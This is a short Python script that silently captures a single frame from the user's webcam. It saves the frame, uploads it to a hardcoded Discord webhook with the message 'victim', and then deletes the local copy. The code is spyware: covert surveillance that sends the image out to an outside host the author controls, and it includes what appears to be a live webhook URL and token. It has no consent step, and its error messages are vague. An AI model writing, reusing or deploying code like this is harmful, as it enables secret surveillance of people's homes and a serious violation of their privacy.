import cv2
import requests
import os

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8'

def capture_image():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Error: Error.")
        return None

    ret, frame = cap.read()
    if not ret:
        print("Error: Error.")
        cap.release()
        return None

    cap.release()
    return frame

def send_to_discord(image_path, message):
    with open(image_path, 'rb') as f:
        files = {'file': f}
        data = {'content': message}
        response = requests.post(DISCORD_WEBHOOK_URL, files=files, data=data)

def main():
    image = capture_image()
    if image is None:
        return

    image_path = 'captured_image.jpg'
    cv2.imwrite(image_path, image)

    message = "victim"
    send_to_discord(image_path, message)

    os.remove(image_path)

if __name__ == "__main__":
    main()
